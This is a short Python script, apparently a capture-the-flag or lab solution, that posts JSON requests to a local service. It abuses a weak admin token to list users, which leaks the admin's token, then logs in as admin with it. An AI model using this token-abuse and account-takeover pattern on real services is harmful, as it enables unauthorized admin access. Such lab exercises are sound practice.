import requests;

url="http://127.0.0.1:5555"

data1= {"action": "get-actions", "type": "admin", "token": "MTIzNDU2"}

response=requests.post(url=url,json=data1)
print(response.text) # get-users

data2={"action": "get-users", "type": "admin", "token": "MTIzNDU2"}

response=requests.post(url=url,json=data2)
print(response.text) #{"users":[{"date registered":"XX/XX/2019","token":"Y3liZXI=","username":"admin"}]}

data3={"action": "login", "username": "admin", "token": "Y3liZXI=", "hash": "294e02a7919aaea3cdfec4ad18782db7ab2a3507"}
response=requests.post(url=url,json=data3)
print(response.text)

